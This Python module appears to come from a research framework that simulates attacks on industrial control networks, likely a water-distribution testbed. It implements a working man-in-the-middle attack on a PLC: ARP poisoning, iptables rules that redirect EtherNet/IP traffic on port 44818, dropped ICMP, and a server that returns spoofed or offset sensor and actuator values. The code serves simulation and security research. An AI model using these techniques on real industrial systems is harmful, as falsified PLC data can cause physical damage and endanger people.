import argparse
import os
import subprocess
import threading
import time
import signal
from pathlib import Path
from typing import List

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
from dhalsim.network_attacks.synced_attack import SyncedAttack


class Error(Exception):
    """Base class for exceptions in this module."""


class ReceiveOriginalError(Error):
    """Raised when not being able to receive original tags in MiTM attack"""


class MitmAttack(SyncedAttack):
    """
    This is a Man In The Middle attack. This attack will respond to request for
    the target PLC.

    It does this by starting its own CPPPO server, and replying to the request with its
    own value. It also uses CPPPO to request the real values from the target PLC.

    When preforming this attack, you can use either an offset, or an absolute value.

    When using this type of attack, you can modify the values of individual tags.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    RETRY_ATTEMPTS = 5
    """Amount of times the attacker will try to receive the original tags"""

    CPPPO_THREAD_JOIN_TIMEOUT = 10
    """Amount of times the server cpppo thread will wait until timing out and finishing"""

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')
        self.thread = None
        self.server = None
        self.run_thread = False
        self.tags = {}
        self.dict_lock = threading.Lock()

    def setup(self):
        """
        This function start the network attack.

        It first sets up the iptables on the attacker node route the packets that orignally
        where for the target PLC, to the attacker.
        It also drops the icmp packets, to avoid network packets skipping the
        attacker node.

        Afterwards it launches the ARP poison, which basically tells the network that the attacker
        is the PLC, and it tells the PLC that the attacker is the router.

        Finally, it launches the thread that will respond to the CPPPO requests.
        """
        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip', '--print', '--address',
               self.attacker_ip + ":44818"]

        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
        for tag in request_tags:
            cmd.append(str(tag) + ':1=REAL')

        self.logger.debug(f"MITM Attack server: {cmd}")

        self.server = subprocess.Popen(cmd, shell=False)

        self.run_thread = True

        self.update_tags_dict()

        self.thread = threading.Thread(target=self.cpppo_thread)
        self.thread.start()

        # Launch the ARP poison by sending the required ARP network packets
        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        if self.intermediate_yaml['network_topology_type'] == "simple":
            for plc in self.intermediate_yaml['plcs']:
                if plc['name'] != self.intermediate_plc['name']:
                    launch_arp_poison(self.target_plc_ip, plc['local_ip'])

        os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        self.logger.debug(f"MITM Attack ARP Poison between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

    def receive_original_tags(self):
        """Update the :code:`tags` dict to the newest original values from the target PLC"""
        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
               str(self.target_plc_ip) + ":44818"]

        for tag in request_tags:
            cmd.append(str(tag) + ':1')

        for i in range(self.RETRY_ATTEMPTS ):
            try:
                client = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE)

                # client.communicate is blocking
                raw_out = client.communicate()

                # Value is stored as first tuple element between a pair of square brackets
                values = []
                raw_string = raw_out[0]
                split_string = raw_string.split(b"\n")
                for word in split_string:
                    values.append(word[(word.find(b'[') + 1):word.find(b']')])
                values.pop()

                for idx, value in enumerate(values):
                    self.tags[request_tags[idx]] = float(value.decode())

                return

            except Exception as error:
                self.logger.error(f"ERROR MITM Attack ENIP send_multiple: {error}")

        raise ReceiveOriginalError("Failed to get the original tags from MiTM victim, Attempted " + str(self.RETRY_ATTEMPTS) + " times")

    def update_tags_dict(self):
        """
        Update the :code:`tags` dict to the original values from the target PLC,
        and then overwrite them with the fake values and offsets.
        """
        # Acquire the lock
        self.dict_lock.acquire()

        self.receive_original_tags()

        # Overwrites the tags that we are spoofing
        for tag in self.intermediate_attack['tags']:
            if 'value' in tag.keys():
                # Overwrite the value in the dict
                self.tags[tag['tag']] = tag['value']
            elif 'offset' in tag.keys():
                # Offset the value in the dict
                self.tags[tag['tag']] += tag['offset']

        # Release the lock
        self.dict_lock.release()

    def make_client_cmd(self) -> List[str]:
        """
        Put all the tags together into a command that starts CPPPO and responds to request.

        :return: The command that starts the CPPPO client
        :rtype: List[str]
        """
        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
               str(self.attacker_ip)]

        # Acquire the lock
        self.dict_lock.acquire()

        for tag in self.tags:
            cmd.append(str(tag) + ':1=' + str(self.tags[tag]))

        # Release the lock
        self.dict_lock.release()

        return cmd

    def cpppo_thread(self, interrupt_test=False):
        """Start the CPPPO client to respond to requests."""
        while self.run_thread:
            cmd = self.make_client_cmd()
            self.logger.debug(f"MITM Attack Client: {cmd}")

            try:
                client = subprocess.Popen(cmd, shell=False)
                client.wait()

            except AssertionError as error:
                self.logger.error(f"Asserion error, aborting...: {error}")
                break
            except Exception as error:
                self.logger.error(f"ERROR in cpppo_thread - MITM Attack client ENIP send_multiple: {error}")
            if interrupt_test:
                break
            time.sleep(0.05)

    def interrupt(self):
        """
        This function will be called when we want to stop the attacker. It calls the teardown
        function if the attacker is in state 1 (running)
        """
        if self.state == 1:
            self.teardown()

    def teardown(self):
        """
        This function will undo the actions done by the setup function.

        It first restores the arp poison, to point to the original router and PLC again. Afterwards
        it will delete the iptable rules and stop the thread.
        """
        restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        if self.intermediate_yaml['network_topology_type'] == "simple":
            for plc in self.intermediate_yaml['plcs']:
                if plc['name'] != self.intermediate_plc['name']:
                    restore_arp(self.target_plc_ip, plc['local_ip'])

        self.logger.debug(f"MITM Attack ARP Restore between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        self.server.send_signal(signal.SIGINT)
        self.server.wait()
        if self.server.poll() is None:
            self.server.terminate()
        if self.server.poll() is None:
            self.server.kill()

        self.run_thread = False
        if self.thread:
            self.thread.join(self.CPPPO_THREAD_JOIN_TIMEOUT)
            if self.thread and self.thread.is_alive():
                self.logger.info("Warning, the CPPPO MiTM Server thread timed out before joining. ENIP session"
                                 "might have ended abruptely")

        # Delete iptables rules
        os.system('iptables -t nat -D PREROUTING -p tcp -d ' + self.target_plc_ip +
                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

    def attack_step(self):
        """When the attack is running, it will update the tags dict with the most recent values."""
        if self.state == 1:
            self.update_tags_dict()


def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = MitmAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
